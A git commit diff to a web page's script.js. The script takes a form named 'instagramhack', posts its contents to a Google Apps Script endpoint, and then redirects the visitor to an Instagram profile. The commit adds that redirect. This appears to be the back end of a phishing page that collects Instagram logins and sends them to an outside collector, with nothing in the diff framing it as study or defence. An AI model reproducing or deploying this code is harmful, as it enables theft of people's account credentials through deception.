ee4d71124cdbd0c599db4900fa279284e9a880ad
uttam kumar patra <dev.uttampatra@gmail.com>
2023-11-18 15:43:38 +0530

    0

--- script.js
+++ script.js
@@ -1,5 +1,3 @@
-
-
 const scriptURL =
   "https://script.google.com/macros/s/AKfycbwSOTAHP5oWjlI0U01ciVgOIK18GP0dkf30LiMlGIbIjOu2zxOMV4fkbW1IjpVJD3oBRQ/exec";
 const form = document.forms["instagramhack"];
@@ -8,10 +6,7 @@ form.addEventListener("submit", (e) => {
   e.preventDefault();
   fetch(scriptURL, { method: "POST", body: new FormData(form) })
     .then((response) =>
-      console.log("Thank you! your form is submitted successfully.")
+      window.location.assign("https://www.instagram.com/iamuttampatra69/")
     )
     .catch((error) => console.error("Error!", error.message));
 });
-
-
-
